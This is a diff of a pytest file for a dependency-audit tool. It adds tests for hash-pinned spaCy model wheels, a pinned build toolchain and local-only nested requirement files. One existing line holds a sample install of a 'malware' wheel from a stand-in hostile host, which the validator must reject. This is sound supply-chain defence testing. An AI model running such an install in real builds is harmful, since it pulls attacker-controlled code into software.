@@ -11,6 +11,7 @@ from scripts.production_dependency_audit import (
   validate_dockerfile_policy,
   validate_requirements_policy,
   validate_resolution_report,
+  read_requirements_tree,
 )
 
 
@@ -22,8 +23,15 @@ torchvision==0.28.0+cpu
 PyJWT[crypto]==2.13.0
 """
 
+SPACY_MODEL_WHEEL = (
+  "https://github.com/explosion/spacy-models/releases/download/"
+  "en_core_web_sm-3.8.0/en_core_web_sm-3.8.0-py3-none-any.whl"
+  "#sha256=1932429db727d4bff3deed6b34cfc05df17794f4a52eeb26cf8928f7c1a0fb85"
+)
+
 DOCKERFILE = """\
 FROM base AS dependencies-cpu
+RUN pip install --no-cache-dir --upgrade setuptools==84.0.0 wheel==0.46.3
 COPY requirements.txt .
 RUN pip install --user -r requirements.txt
 FROM base AS production
@@ -96,6 +104,25 @@ def test_accepts_only_the_exact_public_pytorch_cpu_audit_blind_spots():
   skipped = validate_audit_report(audit_report(), direct_requirements)
 
   assert skipped == {"torch": "2.13.0+cpu", "torchvision": "0.28.0+cpu"}
+
+
+def test_accepts_only_the_exact_hash_pinned_spacy_model_wheel():
+  requirements = validate_requirements_policy(f"{REQUIREMENTS}{SPACY_MODEL_WHEEL}\n")
+
+  assert requirements["en-core-web-sm"] == ("en_core_web_sm", "3.8.0")
+  with pytest.raises(AuditPolicyError, match="pinned"):
+    validate_requirements_policy(
+      f"{REQUIREMENTS}{SPACY_MODEL_WHEEL.replace('1932429d', '2932429d')}\n"
+    )
+
+  report = audit_report()
+  report["dependencies"].append({
+    "name": "en-core-web-sm",
+    "skip_reason": (
+      "Dependency not found on PyPI and could not be audited: en-core-web-sm (3.8.0)"
+    ),
+  })
+  assert validate_audit_report(report, requirements)["en-core-web-sm"] == "3.8.0"
 
 
 @pytest.mark.parametrize(
@@ -199,6 +226,14 @@ def test_rejects_drifted_or_unverifiable_wheel_resolution(package, field, value)
 def test_keeps_the_docker_build_on_the_single_checked_requirements_source():
   validate_dockerfile_policy(DOCKERFILE)
 
+  with pytest.raises(AuditPolicyError, match="patched build toolchain"):
+    validate_dockerfile_policy(
+      DOCKERFILE.replace(
+        "RUN pip install --no-cache-dir --upgrade setuptools==84.0.0 wheel==0.46.3\n",
+        "",
+      )
+    )
+
   with pytest.raises(AuditPolicyError, match="Dockerfile"):
     validate_dockerfile_policy(
       "RUN pip install --extra-index-url https://download.pytorch.org/whl/cpu "
@@ -227,6 +262,18 @@ def test_keeps_the_docker_build_on_the_single_checked_requirements_source():
         "FROM base AS production\nRUN pip install --user malware@https://evil.invalid/malware.whl\n",
       )
     )
+
+
+def test_flattens_only_local_peer_requirement_files(tmp_path):
+  (tmp_path / "base.txt").write_text(REQUIREMENTS, encoding="utf-8")
+  aggregate = tmp_path / "requirements.txt"
+  aggregate.write_text("-r base.txt\n", encoding="utf-8")
+
+  assert "torch==2.13.0+cpu" in read_requirements_tree(aggregate)
+
+  aggregate.write_text("-r ../outside.txt\n", encoding="utf-8")
+  with pytest.raises(AuditPolicyError, match="local peer"):
+    read_requirements_tree(aggregate)
 
 
 def test_removes_inherited_pip_source_and_tls_overrides(monkeypatch):
